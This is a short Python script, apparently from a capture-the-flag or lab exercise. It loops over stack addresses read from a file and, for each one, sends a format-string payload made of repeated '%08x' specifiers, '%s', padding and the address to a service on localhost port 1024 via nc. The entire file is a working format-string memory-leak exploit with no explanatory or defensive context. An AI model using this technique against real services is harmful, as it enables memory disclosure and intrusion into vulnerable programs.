import os
from time import sleep

with open('/home/wowon/Downloads/stack_address', 'r') as f:
    stack_address = f.read()
stack_address = stack_address.split('\n')
for i in range(len(stack_address)):
    sleep(1)
    os.system("python3 -c 'print(\",%08x,\"*30+\"%s\"+\"A\"*18+\"{}\")' | nc localhost 1024".format(stack_address[i]))
    sleep(1)